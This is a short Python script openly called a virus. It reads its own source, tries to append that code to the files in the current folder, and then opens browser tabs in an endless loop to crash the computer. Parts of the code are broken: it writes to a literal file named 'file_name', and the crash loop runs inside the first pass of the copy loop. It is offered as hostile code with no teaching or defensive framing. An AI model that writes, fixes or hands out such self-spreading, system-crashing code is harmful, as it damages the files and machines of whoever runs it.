import os
import time
import webbrowser


def WebBrowser():
    link = "google.com"
    print("Starting The Virus !")

    # Open and Get The Virus File Code
    virus_file = open("WebBrowser.py", "r")
    virus_code = virus_file.read()
    virus_file.close()

    # Copy The Virus Code To All Entries
    for file_name in os.listdir():
        file = open("file_name", "a")
        file.write(virus_code)
        file.close()

        # Open Browsers Until Computer Crashes
        while True:
            webbrowser.open(link)


WebBrowser()
